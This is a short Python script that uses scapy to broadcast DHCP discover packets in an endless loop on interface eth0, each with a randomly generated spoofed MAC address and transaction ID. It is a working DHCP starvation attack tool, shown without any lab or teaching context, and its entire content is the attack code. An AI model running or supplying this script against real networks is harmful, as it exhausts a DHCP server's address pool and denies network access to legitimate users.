#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from scapy.all import (
    Ether,
    RandMAC,
    IP,
    UDP,
    BOOTP,
    DHCP,
    sendp
)
import random


def dhcp_discover(iface):
    while 1:
        xid_random = random.randint(1, 900000000)
        mac_random = str(RandMAC())
        dhcp_discover = (Ether(src=mac_random, dst='ff:ff:ff:ff:ff:ff') /
                         IP(src='0.0.0.0', dst='255.255.255.255') /
                         UDP(sport=68, dport=67) /
                         BOOTP(chaddr=mac_random, xid=xid_random, flags=0x8000) /
                         DHCP(options=[('message-type', 'discover')]
                              ))

        sendp(dhcp_discover, iface=iface)


if __name__ == '__main__':
    iface = 'eth0'
    dhcp_discover(iface)
